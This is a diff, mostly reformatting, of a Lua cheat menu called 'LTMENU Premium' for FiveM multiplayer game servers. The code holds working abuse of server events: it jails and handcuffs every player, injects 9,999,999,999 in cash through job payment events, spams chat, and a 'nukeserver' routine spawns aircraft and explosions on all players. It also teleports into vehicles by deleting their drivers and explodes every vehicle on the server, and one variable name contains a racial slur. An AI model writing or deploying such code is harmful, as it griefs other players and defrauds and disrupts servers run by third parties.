-                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
-                    SetVehicleAlarm(NearestVehicle, false)
-                    SetVehicleDoorsLocked(NearestVehicle, 1)
-                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
-                else
-                    local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
-                    ClearPedTasksImmediately(driverPed)
-                    SetEntityAsMissionEntity(driverPed, 1, 1)
-                    DeleteEntity(driverPed)
-                    SetPedIntoVehicle(playerPed, NearestVehicle, -1)
-                    SetVehicleAlarm(NearestVehicle, false)
-                    SetVehicleDoorsLocked(NearestVehicle, 1)
-                    SetVehicleNeedsToBeHotwired(NearestVehicle, false)
-                end
-            elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
-                if IsVehicleSeatFree(NearestPlane, -1) then
-                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
-                    SetVehicleAlarm(NearestPlane, false)
-                    SetVehicleDoorsLocked(NearestPlane, 1)
-                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
-                else
-                    local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
-                    ClearPedTasksImmediately(driverPed)
-                    SetEntityAsMissionEntity(driverPed, 1, 1)
-                    DeleteEntity(driverPed)
-                    SetPedIntoVehicle(playerPed, NearestPlane, -1)
-                    SetVehicleAlarm(NearestPlane, false)
-                    SetVehicleDoorsLocked(NearestPlane, 1)
-                    SetVehicleNeedsToBeHotwired(NearestPlane, false)
-                end
+        elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
+            if IsVehicleSeatFree(NearestPlane, -1) then
+                SetPedIntoVehicle(playerPed, NearestPlane, -1)
+                SetVehicleAlarm(NearestPlane, false)
+                SetVehicleDoorsLocked(NearestPlane, 1)
+                SetVehicleNeedsToBeHotwired(NearestPlane, false)
+            else
+                local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
+                ClearPedTasksImmediately(driverPed)
+                SetEntityAsMissionEntity(driverPed, 1, 1)
+                DeleteEntity(driverPed)
+                SetPedIntoVehicle(playerPed, NearestPlane, -1)
+                SetVehicleAlarm(NearestPlane, false)
+                SetVehicleDoorsLocked(NearestPlane, 1)
+                SetVehicleNeedsToBeHotwired(NearestPlane, false)
             end
-            drawNotification("~g~Teleported Into Nearest Vehicle!")
         end
-
+        drawNotification("~g~Teleported Into Nearest Vehicle!")
     end
+end
 
-
-
-	local function d(e)
+local function d(e)
     local f = {}
     local h = GetGameTimer() / 200
     f.r = math.floor(math.sin(h * e + 0) * 127 + 128)
@@ -4188,7 +4291,7 @@ function teleportToNearestVehicle()
     f.b = math.floor(math.sin(h * e + 4) * 127 + 128)
     return f
 end
-	
+
 local cL = true
 local cM = false
 local cN = true
@@ -4199,7 +4302,7 @@ Citizen.CreateThread(
             Wait(1)
             for f = 0, 128 do
                 if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
-                   local ped = GetPlayerPed(f)
+                    local ped = GetPlayerPed(f)
                     blip = GetBlipFromEntity(ped)
                     x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                     x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
@@ -4246,8 +4349,8 @@ Citizen.CreateThread(
                                 elseif vehClass == 16 then
                                     if
                                         vehModel == GetHashKey('besra') or vehModel == GetHashKey('hydra') or
-                                            vehModel == GetHashKey('lazer')
-                                     then
+                                        vehModel == GetHashKey('lazer')
+                                    then
                                         if blipSprite ~= 424 then
                                             SetBlipSprite(blip, 424)
                                             Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
@@ -4264,8 +4367,8 @@ Citizen.CreateThread(
                                     end
                                 elseif
                                     vehModel == GetHashKey('insurgent') or vehModel == GetHashKey('insurgent2') or
-                                        vehModel == GetHashKey('limo2')
-                                 then
+                                    vehModel == GetHashKey('limo2')
+                                then
                                     if blipSprite ~= 426 then
                                         SetBlipSprite(blip, 426)
                                         Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
@@ -4332,53 +4435,74 @@ function ShootPlayer(player)
     SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
 end
 
-
 function SpawnObjOnPlayer(modelHash)
     local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
-    local obj CreateObject(modelHash, coords.x, coords.y, coords.z, true, true, true)
-        if attachProp then
-            AttachEntityToEntity(obj ,GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true ,true ,false, true, 1, true)
-        end
+    local obj
+    CreateObject(modelHash, coords.x, coords.y, coords.z, true, true, true)
+    if attachProp then
+        AttachEntityToEntity(obj, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005), 0.4,
+            0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
+    end
 end
 
 function nukeserver()
     Citizen.CreateThread(function()
-        local dg="Avenger"
-        local dh="CARGOPLANE"
-        local di="luxor"
-        local dj="maverick"
-        local dk="blimp2"
+        local dg = "Avenger"
+        local dh = "CARGOPLANE"
+        local di = "luxor"
+        local dj = "maverick"
+        local dk = "blimp2"
 
-        while not HasModelLoaded(GetHashKey(dh))do
+        while not HasModelLoaded(GetHashKey(dh)) do
             Citizen.Wait(-1000)
             RequestModel(GetHashKey(dh))
         end
 
-        while not HasModelLoaded(GetHashKey(di))do
-            Citizen.Wait(-1000)RequestModel(GetHashKey(di))
+        while not HasModelLoaded(GetHashKey(di)) do
+            Citizen.Wait(-1000)
+            RequestModel(GetHashKey(di))
         end
 
-        while not HasModelLoaded(GetHashKey(dg))do
-            Citizen.Wait(-1000)RequestModel(GetHashKey(dg))
+        while not HasModelLoaded(GetHashKey(dg)) do
+            Citizen.Wait(-1000)
+            RequestModel(GetHashKey(dg))
         end
 
-        while not HasModelLoaded(GetHashKey(dj))do
-            Citizen.Wait(-1000)RequestModel(GetHashKey(dj))
+        while not HasModelLoaded(GetHashKey(dj)) do
+            Citizen.Wait(-1000)
+            RequestModel(GetHashKey(dj))
         end
 
-        while not HasModelLoaded(GetHashKey(dk))do
-            Citizen.Wait(-1000)RequestModel(GetHashKey(dk))
+        while not HasModelLoaded(GetHashKey(dk)) do
+            Citizen.Wait(-1000)
+            RequestModel(GetHashKey(dk))
         end
 
-        for bs=0,9 do
-            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"LTMENU Premium")
+        for bs = 0, 9 do
+            TriggerServerEvent("_chat:messageEntered", "~r~", { 141, 211, 255 }, "LTMENU Premium")
         end
 
-        for i=0,128 do
-            local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
+        for i = 0, 128 do
+            local di = CreateVehicle(GetHashKey(dg), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
+            CreateVehicle(GetHashKey(dg), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
+            CreateVehicle(GetHashKey(dg), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
+            CreateVehicle(GetHashKey(dh), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
+            CreateVehicle(GetHashKey(dh), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
+            CreateVehicle(GetHashKey(dh), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
+            CreateVehicle(GetHashKey(di), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
+            CreateVehicle(GetHashKey(di), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
+            CreateVehicle(GetHashKey(di), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
+            CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
+            CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
+            CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
+            CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
+            CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
+            CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
+            AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and
+            AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
         end
-     end)
-    end
+    end)
+end
 
 function rotDirection(rot)
     local radianz = rot.z * 0.0174532924
@@ -4391,7 +4515,6 @@ function rotDirection(rot)
 end
 
 function GetDistance(pointA, pointB)
-
     local aX = pointA.x
     local aY = pointA.y
     local aZ = pointA.z
@@ -4405,33 +4528,33 @@ function GetDistance(pointA, pointB)
     local zBA = bZ - aZ
 
     local y2 = yBA * yBA
-    local x2 =  xBA * xBA
+    local x2 = xBA * xBA
     local sum2 = y2 + x2
 
     return math.sqrt(sum2 + zBA)
 end
 
 function getPosition()
-  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
-  return x,y,z
+    local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
+    return x, y, z
 end
 
 function getCamDirection()
-  local heading = GetGameplayCamRelativeHeading()+GetEntityHeading(GetPlayerPed(-1))
-  local pitch = GetGameplayCamRelativePitch()
+    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(GetPlayerPed(-1))
+    local pitch = GetGameplayCamRelativePitch()
 
-  local x = -math.sin(heading*math.pi/180.0)
-  local y = math.cos(heading*math.pi/180.0)
-  local z = math.sin(pitch*math.pi/180.0)
+    local x = -math.sin(heading * math.pi / 180.0)
+    local y = math.cos(heading * math.pi / 180.0)
+    local z = math.sin(pitch * math.pi / 180.0)
 
-  local len = math.sqrt(x*x+y*y+z*z)
-  if len ~= 0 then
-    x = x/len
-    y = y/len
-    z = z/len
-  end
+    local len = math.sqrt(x * x + y * y + z * z)
+    if len ~= 0 then
+        x = x / len
+        y = y / len
+        z = z / len
+    end
 
-  return x,y,z
+    return x, y, z
 end
 
 function RotToDirection(rot)
@@ -4491,44 +4614,45 @@ Citizen.CreateThread(
             if infStamina then
                 RestorePlayerStamina(PlayerId(), 1.0)
             end
-			
-			if chatspam then
+
+            if chatspam then
                 TriggerServerEvent(
                     '_chat:messageEntered',
                     'LTMENU',
-                    {0, 0x99, 255},
+                    { 0, 0x99, 255 },
                     '/ooc LT PREMIUM'
                 )
-                TriggerServerEvent('_chat:messageEntered', '^8LTMENU Premium', {0, 0x99, 255}, '^3 LTMENU Premium LTMENU ON YOUTUBE')
-				else
-				
-            end
-	
-			if banallusers then
-				for i = 0, 128 do
-				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
-				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
-				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "~r~LTMENU ON YOUTUBE")
-				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "~r~LTMENU ON YOUTUBE")
-					end
-				end
+                TriggerServerEvent('_chat:messageEntered', '^8LTMENU Premium', { 0, 0x99, 255 },
+                    '^3 LTMENU Premium LTMENU ON YOUTUBE')
+            else
 
-						if esxdestroy then
-				for i = 0, 128 do
-						TriggerServerEvent("esx_truckerjob:pay", 9999999999)
-						TriggerServerEvent("AdminMenu:giveCash", 9999999999)
-						TriggerServerEvent("esx_dmvschool:pay",  9999999999)
-						TriggerServerEvent("LegacyFuel:PayFuel", 9999999999)
-				end
-			end
-			
+            end
+
+            if banallusers then
+                for i = 0, 128 do
+                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
+                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
+                    TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "~r~LTMENU ON YOUTUBE")
+                    TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "~r~LTMENU ON YOUTUBE")
+                end
+            end
+
+            if esxdestroy then
+                for i = 0, 128 do
+                    TriggerServerEvent("esx_truckerjob:pay", 9999999999)
+                    TriggerServerEvent("AdminMenu:giveCash", 9999999999)
+                    TriggerServerEvent("esx_dmvschool:pay", 9999999999)
+                    TriggerServerEvent("LegacyFuel:PayFuel", 9999999999)
+                end
+            end
+
             if invisible then
                 SetEntityVisible(GetPlayerPed(-1), false, 0)
             else
                 SetEntityVisible(GetPlayerPed(-1), true, 0)
             end
-			
-			
+
+
             if freezePlayer then
                 ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
             end
@@ -4536,8 +4660,8 @@ Citizen.CreateThread(
             if crosshair then
                 ShowHudComponentThisFrame(14)
             end
-			
-			if ci then
+
+            if ci then
                 local cK = false
                 local cL = 130
                 local cM = 0
@@ -4603,11 +4727,11 @@ Citizen.CreateThread(
             end
 
             if crosshair2 then
-                ch("~r~+",0.495,0.484)
+                ch("~r~+", 0.495, 0.484)
             end
 
             if crosshair3 then
-                ch("~r~.",0.4968,0.478)
+                ch("~r~.", 0.4968, 0.478)
             end
 
             local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
@@ -4618,18 +4742,18 @@ Citizen.CreateThread(
                 end
             end
 
-			if freezeall then
-				for i = 0, 128 do
-						TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
-						TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
-						TriggerServerEvent("cuffServer", GetPlayerServerId(i))
-						TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
-						TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
-						TriggerServerEvent("esx_handcuffs:cuffing", GetPlayerServerId(i))
-						TriggerServerEvent("esx_policejob:handcuff", GetPlayerServerId(i))
-					end
-				end
-			
+            if freezeall then
+                for i = 0, 128 do
+                    TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
+                    TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
+                    TriggerServerEvent("cuffServer", GetPlayerServerId(i))
+                    TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
+                    TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
+                    TriggerServerEvent("esx_handcuffs:cuffing", GetPlayerServerId(i))
+                    TriggerServerEvent("esx_policejob:handcuff", GetPlayerServerId(i))
+                end
+            end
+
             if blowall then
                 for i = 0, 128 do
                     local ped = GetPlayerPed(i)
@@ -4677,58 +4801,57 @@ Citizen.CreateThread(
                 end
 
                 if t2x then
-                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),2.0)
+                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0)
                 end
 
                 if t4x then
-                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),4.0)
+                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0)
                 end
 
                 if t8x then
-                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),8.0)
+                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0)
                 end
 
                 if t16x then
-                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),16.0)
+                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0)
                 end
             end
 
 
             if Noclip then
-        local noclip_speed = 1.0
-        local ped = GetPlayerPed(-1)
-        local x,y,z = getPosition()
-        local dx,dy,dz = getCamDirection()
-        local speed = noclip_speed
-		SetEntityVisible(GetPlayerPed(-1), false, false)
-		SetEntityInvincible(GetPlayerPed(-1), true)
-		SetEntityVisible(ped, false);
+                local noclip_speed = 1.0
+                local ped = GetPlayerPed(-1)
+                local x, y, z = getPosition()
+                local dx, dy, dz = getCamDirection()
+                local speed = noclip_speed
+                SetEntityVisible(GetPlayerPed(-1), false, false)
+                SetEntityInvincible(GetPlayerPed(-1), true)
+                SetEntityVisible(ped, false);
 
-      SetEntityVelocity(ped, 0.0001, 0.0001, 0.0001)
-      if IsControlPressed(0, 21) then
-          speed = speed + 3
-          end
-      if IsControlPressed(0, 19) then
-          speed = speed - 0.5
-      end
-             if IsControlPressed(0,32) then
-              x = x+speed*dx
-              y = y+speed*dy
-              z = z+speed*dz
-               end
+                SetEntityVelocity(ped, 0.0001, 0.0001, 0.0001)
+                if IsControlPressed(0, 21) then
+                    speed = speed + 3
+                end
+                if IsControlPressed(0, 19) then
+                    speed = speed - 0.5
+                end
+                if IsControlPressed(0, 32) then
+                    x = x + speed * dx
+                    y = y + speed * dy
+                    z = z + speed * dz
+                end
 
 
-               if IsControlPressed(0,269) then
-              x = x-speed*dx
-              y = y-speed*dy
-              z = z-speed*dz
-               end
-        SetEntityCoordsNoOffset(ped,x,y,z,true,true,true)
+                if IsControlPressed(0, 269) then
+                    x = x - speed * dx
+                    y = y - speed * dy
+                    z = z - speed * dz
+                end
+                SetEntityCoordsNoOffset(ped, x, y, z, true, true, true)
             else
-            SetEntityVisible(GetPlayerPed(-1), true, false)
-            SetEntityInvincible(GetPlayerPed(-1), false)
-
-         end
+                SetEntityVisible(GetPlayerPed(-1), true, false)
+                SetEntityInvincible(GetPlayerPed(-1), false)
+            end
 
             if WADOHWIB then
                 local gotEntity = getEntity(PlayerId())
@@ -4765,7 +4888,7 @@ Citizen.CreateThread(
                     end
                 end
             end
-			if destroyvehicles then
+            if destroyvehicles then
                 for vehicle in EnumerateVehicles() do
                     if vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false) then
                         NetworkRequestControlOfEntity(vehicle)
@@ -4774,15 +4897,15 @@ Citizen.CreateThread(
                     end
                 end
             end
-			if explodevehicles then
-				for vehicle in EnumerateVehicles() do
-					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
-						NetworkRequestControlOfEntity(vehicle)
-						NetworkExplodeVehicle(vehicle, true, true, false)
-					end
-				end
-			end
-			
+            if explodevehicles then
+                for vehicle in EnumerateVehicles() do
+                    if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
+                        NetworkRequestControlOfEntity(vehicle)
+                        NetworkExplodeVehicle(vehicle, true, true, false)
+                    end
+                end
+            end
+
             if esp then
                 for i = 0, 128 do
                     if i ~= PlayerId(-1) and GetPlayerServerId(i) ~= 0 then
@@ -4793,12 +4916,12 @@ Citizen.CreateThread(
                         local db =
                             '~h~Name: ' ..
                             GetPlayerName(i) ..
-                                '\nServer ID: ' ..
-                                    GetPlayerServerId(i) ..
-                                        '\nPlayer ID: ' ..
-                                            i ..
-                                                '\nDist: ' ..
-                                                    math.round(GetDistanceBetweenCoords(d8, d9, da, x, y, z, true), 1)
+                            '\nServer ID: ' ..
+                            GetPlayerServerId(i) ..
+                            '\nPlayer ID: ' ..
+                            i ..
+                            '\nDist: ' ..
+                            math.round(GetDistanceBetweenCoords(d8, d9, da, x, y, z, true), 1)
                         if IsPedInAnyVehicle(d7, true) then
                             local dc =
                                 GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(d7))))
@@ -4983,8 +5106,8 @@ Citizen.CreateThread(
             end
 
             if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
-                    SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
-                end
+                SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
+            end
 
             if rainbowTint then
                 for i = 0, #allWeapons do
@@ -4995,16 +5118,17 @@ Citizen.CreateThread(
             end
 
             if showCoords then
-                kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl,ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
-                roundx=tonumber(string.format("%.2f",kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc))
-                roundy=tonumber(string.format("%.2f",riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl))
-                roundz=tonumber(string.format("%.2f",ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw))
-				local playerPedsss = PlayerPedId()
-				roundzxx = GetEntityHeading(playerPedsss)
-                bf("~r~X:~s~ "..roundx,0.05,0.00)
-                bf("~r~Y:~s~ "..roundy,0.11,0.00)
-                bf("~r~Z:~s~ "..roundz,0.17,0.00)
-				bf("~r~H:~s~ "..roundzxx,0.23,0.00)
+                kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc, riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl, ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw =
+                table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
+                roundx = tonumber(string.format("%.2f", kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc))
+                roundy = tonumber(string.format("%.2f", riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl))
+                roundz = tonumber(string.format("%.2f", ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw))
+                local playerPedsss = PlayerPedId()
+                roundzxx = GetEntityHeading(playerPedsss)
+                bf("~r~X:~s~ " .. roundx, 0.05, 0.00)
+                bf("~r~Y:~s~ " .. roundy, 0.11, 0.00)
+                bf("~r~Z:~s~ " .. roundz, 0.17, 0.00)
+                bf("~r~H:~s~ " .. roundzxx, 0.23, 0.00)
             end
 
             if bulletGun then
@@ -5021,9 +5145,15 @@ Citizen.CreateThread(
                             Citizen.Wait(-1000)
                         end
                     end
-                    ShootSingleBulletBetweenCoords(add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).z, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).z, 250, true, bullet, PlayerPedId(), true, false, -1.0)
+                    ShootSingleBulletBetweenCoords(
+                    add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).x,
+                        add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).y,
+                        add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).z,
+                        add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).x,
+                        add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).y,
+                        add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).z, 250,
+                        true, bullet, PlayerPedId(), true, false, -1.0)
                 end
-
             end
 
             if vehicleGun then
@@ -5046,10 +5176,11 @@ Citizen.CreateThread(
                 if HasModelLoaded(model) then
                     if IsPedShooting(PlayerPedId()) then
                         if IsPedOnFoot(PlayerPedId()) then
-                        local veh = CreateVehicle(model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
-                        SetVehicleForwardSpeed(veh, 120.0)
-                        SetModelAsNoLongerNeeded(model)
-                        SetVehicleAsNoLongerNeeded(veh)
+                            local veh = CreateVehicle(model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading,
+                                true, true)
+                            SetVehicleForwardSpeed(veh, 120.0)
+                            SetModelAsNoLongerNeeded(model)
+                            SetVehicleAsNoLongerNeeded(veh)
                         end
                     end
                 end
@@ -5073,14 +5204,16 @@ Citizen.CreateThread(
                 end
 
 
-                
+
                 if HasModelLoaded(model) then
                     if IsPedShooting(PlayerPedId()) then
-                        local spawnedPed = CreatePed(26, model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
+                        local spawnedPed = CreatePed(26, model, spawnPosition.x, spawnPosition.y, spawnPosition.z,
+                            heading, true, true)
                         SetEntityRecordsCollisions(spawnedPed, true)
                         for f = 0.0, 75.0 do
                             if HasEntityCollidedWithAnything(spawnedPed) then break end
-                                ApplyForceToEntity(spawnedPed, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
+                            ApplyForceToEntity(spawnedPed, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0,
+                                false, false, true, true, false, true)
                         end
                     end
                 end
@@ -5100,128 +5233,121 @@ Citizen.CreateThread(
                             SetVehicleForwardSpeed(veh, 150.0)
                         else
                             for i = 0, 10 do
-                                ApplyForceToEntity(entity, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
+                                ApplyForceToEntity(entity, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0,
+                                    false, false, true, true, false, true)
                             end
                         end
                     end
                 end
             end
 
-					if IsControlPressed(0, 323) and DoesEntityExist(Deer.Handle) then
-		Deer.Destroy()
-		end
-			
+            if IsControlPressed(0, 323) and DoesEntityExist(Deer.Handle) then
+                Deer.Destroy()
+            end
+
             if bifegfubffff then
                 local impact, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                 if impact then
                     AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
                 end
             end
-			
-			 if rainbow then
-                    local color = k(1.0)
-                    for i = 0, #allMenus do
-                        LTPREMIUM.SetSpriteColor(allMenus[i], color.r, color.g, color.b, 255)  
-                    end  
-                    for i, dA in pairs(bd) do                 
-                        LTPREMIUM.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)  
-                    end
-                    for i, dA in pairs(be) do 
-                        LTPREMIUM.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)
-                    end
+
+            if rainbow then
+                local color = k(1.0)
+                for i = 0, #allMenus do
+                    LTPREMIUM.SetSpriteColor(allMenus[i], color.r, color.g, color.b, 255)
                 end
-                
-                if animated then                                   
-                            Citizen.Wait(50)                  
-                            for i = 0, #allMenus do
-                                LTPREMIUM.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal1") 
-                            end
-                            for i, dA in pairs(bd) do
-                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
-                                  
-                            end
-                            for i, dA in pairs(be) do 
-                                LTPREMIUM.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
-                                
-                            end      
-                            Citizen.Wait(50)                  
-                            for i = 0, #allMenus do
-                                LTPREMIUM.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal2") 
-                            end
-                            for i, dA in pairs(bd) do
